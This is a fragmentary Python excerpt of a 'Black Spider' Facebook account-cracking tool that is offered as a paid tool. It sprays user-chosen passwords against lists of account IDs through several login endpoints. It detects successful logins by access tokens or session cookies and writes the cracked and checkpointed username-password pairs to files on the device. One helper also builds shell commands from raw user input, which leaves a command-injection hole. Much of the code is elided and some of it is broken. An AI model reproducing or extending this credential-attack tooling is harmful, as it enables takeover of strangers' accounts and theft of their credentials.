...
def main():
            os.system('clear')
            print(logo)
            print(" [1] Start File Cracking  ")
            print(" [2] Start Dump Public ID")
            print(" [0] Exit ")
            key = input(" [?] Choose  : ")
            if key in [""]:
...
class __crack__:
    ...
    def plerr(self):
        ...
        if _jokowi_kontol_ in ('M', 'm'):
            ...
            print('\n [*] Example : 123456 or 123456789 For OLd Idz ')
            while True:
                pwek = input('\n [*] Enter Password : ')
                if pwek == '':
                    print('\nJangan Kosong')
                    ...
                    def _sempak_(bse=None):
                        ...
                        if boy == '':
                            ...
                            os.system('clear')
                            print(logo)
                            print('\x1b[1;97m [*] Your clonnig started wait.... ')
                            print('\x1b[1;97m [*] Your ok ids saved -> BS_OK.text')
                            print('\x1b[1;97m [*] Your cp ids saved -> BS_CP.text')
                            print('\x1b[1;97m [*] Thanks using my paid tools')
                            print('\x1b[1;92m______________________________________________')
                            ...
                            exit()
                    print(' [1] Choice Method [B-API] ')
                    print(' [2] Choice Method [MBASIC]')
                    print(' [3] Choice Method [MOBILE] ')
                    _sempak_(pwek.split(','))
                    break
            ...
            #print('\nLu kok kayak BLCK_SPIDER ya?')
            exit()
        return
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;92m[BLACK-SPIDER] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                print('\r\033[1;92m[BS-OK] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s %s'%(user,pw,tahun(user))
                ok.append(wrt)
                open('/sdcard/BS_OK.txt','a').write('%s\n' % wrt)
                break
                continue
                ...
                try:
                    ...
                    print('\r\033[1;91m[BS-CP] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('/sdcard/BS_CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    ...
                    pass
                print('\r\033[1;91m[BS-CP] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('/sdcard/BS_CP.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;32m[BS-OK] %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('/sdcard/BS_OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;92m[BS-OK] %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('/sdcard/BS_OK.txt','a').write('%s\n' % wrt)
                break
...
def sep():
    ...
    try:
        ...
        limit = 1
    print ('\033[1;37m Example /sdcard/Black_Spider.txt')
    file_name = input('\033[1;37m Input file name : ')
    print ('\033[1;37m Example Black_Spider.txt')
...
def dupcutter():
	...
	imtiaz = input('[->] File Path   : ')
	haider = input('[->] New File Save As : ')
	os.system('touch ' +haider)
	os.system('sort -r '+imtiaz+' | uniq > '+haider)
	print("")
	print("")
	print(linesmall)
	print("[*] Removing Successful  From File " + imtiaz )
